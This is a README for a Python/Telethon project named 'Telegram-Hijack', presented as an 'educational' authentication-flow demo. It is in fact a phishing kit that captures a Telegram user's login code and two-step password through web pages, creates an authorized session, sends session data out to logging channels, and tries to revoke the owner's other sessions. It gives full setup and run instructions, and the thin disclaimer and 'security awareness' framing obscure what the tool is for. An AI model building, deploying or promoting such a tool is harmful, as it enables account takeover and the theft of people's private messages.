# Telegram Authentication Flow Demo (Educational)

This project is an educational Telegram authentication-flow simulator built with a web frontend and Telethon backend. It demonstrates how contact sharing, OTP verification, optional two-step password entry, and session creation can be orchestrated in one async app.

**Disclaimer:** This repository is for **education, defensive security awareness, and research**. Do not use it to access accounts or data without explicit authorization. Unauthorized use is illegal and unethical.

## What This Bot Does

- Runs an `aiohttp` web app with pages for contact/phone flow, OTP entry, password entry, and a final profile feed.
- Runs a Telethon bot listener that receives shared contacts and triggers Telegram login code requests.
- Verifies OTP and optional two-step password, then creates an authorized Telegram session.
- Supports logging events/session data to configured channels for controlled testing environments.
- Supports configurable profile videos from either local `/media` files or direct external URLs.

## Features

- **Async architecture:** Web routes and Telegram client logic run in one non-blocking Python app.
- **OTP + 2FA handling:** Supports both code verification and password-required accounts.
- **Session lifecycle helpers:** Includes logic to attempt revoking other authorizations with retry handling.
- **Config-driven behavior:** Most UI and flow behavior is controlled via `.env`.
- **Developer-friendly workflow:** Optional live-reload mode is available via `main.py`.

## Use Cases

- Security awareness demos for social-engineering education.
- Red-team or blue-team lab simulations in authorized environments.
- Research and testing of Telegram login/session handling behavior.
- Training material for secure-authentication discussions.

## Tech Stack

- **Telethon** for Telegram API interaction and session management.
- **Aiohttp** for async web server routes and request handling.
- **Jinja2 / aiohttp_jinja2** for rendering HTML templates.
- **Livereload** for local development refresh workflow.

## Project Structure

```

.
├── sessions/
│   └── (session files will be stored here)
├── templates/
│   ├── feed.html
│   ├── index.html
│   ├── code.html
│   ├── password.html
├── app.py
├── telegram_client.py
└── main.py

````

## Getting Started

Follow these instructions to get a copy of the project up and running on your local machine for development and testing purposes.

### Prerequisites

* Python 3.8+
* `pip` (Python package installer)

### Installation

1.  **Clone the repository:**
    ```bash
    git clone [https://github.com/LegendXtra/Telegram-Hijack.git](https://github.com/LegendXtra/Telegram-Hijack.git)
    cd tgSession
    ```

2.  **Install dependencies:**
    ```bash
    pip3 install -r requirements.txt
    ```

### Configuration

Create a `.env` file in the root directory of the project and add your Telegram API credentials:

````
API_ID=123456
API_HASH=64e5f247fbd71144c718363803XXXXXX
````
* **How to get `API_ID` and `API_HASH`:**
    1.  Go to [my.telegram.org](https://my.telegram.org/).
    2.  Log in with your Telegram account.
    3.  Click on "API development tools".
    4.  Create a new application. The `API_ID` and `API_HASH` will be displayed there.

### How to Run

You have two options to run the demo:

1.  **With Live Reload (Recommended for Development):**
    This will run both the `aiohttp` web server and the `livereload` proxy for automatic browser refreshes.
    ```bash
    python main.py
    ```
    Access the application in your browser at `http://localhost:5500`.

2.  **Run Web Application Only:**
    This will run just the `aiohttp` web server. You'll need to manually refresh your browser to see changes.
    ```bash
    python app.py
    ```
    Access the application in your browser at `http://localhost:8080`.

## Contributing

Feel free to explore, learn from, and contribute to this educational project. Pull requests are welcome!
